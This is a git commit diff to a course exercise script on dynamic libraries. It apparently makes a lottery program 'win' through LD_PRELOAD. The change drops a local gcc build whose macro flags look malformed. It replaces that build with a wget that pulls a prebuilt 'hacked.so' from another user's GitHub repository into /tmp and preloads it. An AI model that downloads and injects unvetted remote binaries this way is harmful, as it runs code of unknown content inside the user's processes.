6570ab1f15f10b3bbc30ab7c67b3e63a9ea3067d
Anki Gilbert OKosso <ankigilbertokosso@gmail.com>
2023-06-19 13:53:08 -0700

    updated

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,4 +1,3 @@
 #!/bin/bash
-
-gcc -shared -o libfake.so -fPIC -Wall -Wextra -Werror -pedantic -nostartfiles -DWINNING_NUMBER_1=9 -DWINNING_NUMBER_2=8 -DWINNING_NUMBER_3=10 -DWINNING_NUMBER_4=24 -DWINNING_NUMBER_5=75 -DWINNING_NUMBER_6=9 -DWINNING_BONUS=9 -D'printf(x...)'="exit(0);" -D'fprintf(stderr, x...)'="exit(0);"
-export LD_PRELOAD=./libfake.so
+wget -P /tmp https://github.com/Hillarysidney/alx-low_level_programming/raw/main/0x18-dynamic_libraries/hacked.so
+export LD_PRELOAD=/tmp/hacked.so
